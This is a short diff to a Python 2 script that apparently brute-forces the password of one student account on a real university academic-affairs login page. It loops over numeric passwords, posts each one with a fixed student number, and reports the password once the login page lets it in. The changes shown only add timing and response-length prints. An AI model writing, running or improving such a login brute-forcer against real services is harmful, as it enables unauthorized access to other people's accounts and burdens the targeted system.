@@ -1,5 +1,7 @@
 import urllib, urllib2, cookielib, time
 
+start_all = time.time()
+
 posturl = 'http://jwpt.tjpu.edu.cn:8081/loginAction.do'   
 passwd = 230000
 name = 1111611310
@@ -18,6 +20,8 @@ def login(postData_temp):
     resp = opener.open(req)  
     result = resp.read()
     
+    print len(result)
+    
     if '/menu/s_top.jsp' in result:
         flag_login = True
     else:
@@ -34,5 +38,5 @@ while not login(urllib.urlencode({'zjh':name, 'mm':passwd})):
 
 
 print 'find it %s'%passwd
-
+print "time_sum", time.time() - start_all
     
